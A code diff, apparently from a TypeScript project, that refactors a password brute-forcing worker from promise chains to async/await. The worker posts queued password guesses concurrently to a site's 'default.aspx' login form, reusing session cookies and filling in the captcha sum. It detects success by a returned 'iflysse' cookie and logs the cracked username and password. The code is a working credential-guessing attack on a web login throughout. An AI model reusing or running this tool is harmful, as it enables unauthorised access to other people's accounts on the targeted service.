@@ -43,7 +43,7 @@ export function worker(username: string,password:string="000000",concurrency:num
         });
         log("sum:", sum);
         log("session", cookieJar);
-        const trypass = async.queue(function(password:string,done){
+        const trypass = async.queue(async function(password:string,done){
           /**
            * 组装数据
            */
@@ -54,32 +54,32 @@ export function worker(username: string,password:string="000000",concurrency:num
           formData.append('winLogin$sfLogin$txtPassword', password);
           formData.append('winLogin$sfLogin$txtValidate', sum + "");
           
-          return fetch(baseUrl + "default.aspx", {
-            method: "post",
-            headers: {
-              cookie: Array.from(cookieJar.values()).join(";")
-            },
-            body: formData
-          })
-          .then(login=>{
+          try {
+            const login = await fetch(baseUrl + "default.aspx", {
+              method: "post",
+              headers: {
+                cookie: Array.from(cookieJar.values()).join(";")
+              },
+              body: formData
+            });
             /**
              * iflysse是登陆成功时拿到的cookie值
              */
-            const iflysse = Utils.getCookie(login)
+            const iflysse = Utils.getCookie(login);
             if (iflysse.length === 0) {
               log("failed ", "password: ", password);
             }
             else {
               log("success ", "用户名: ", username, "密码: ", password);
               success = true;
-              resolve("success "+ "用户名: "+ username+ "密码: "+ password)
+              resolve("success " + "用户名: " + username + "密码: " + password);
             }
-            done()
-          })
-          .catch(e=>{
-            log(e)
-            done()
-          })
+            done();
+          }
+          catch (e) {
+            log(e);
+            done();
+          }
         },concurrency)
         
         const push = ()=>{
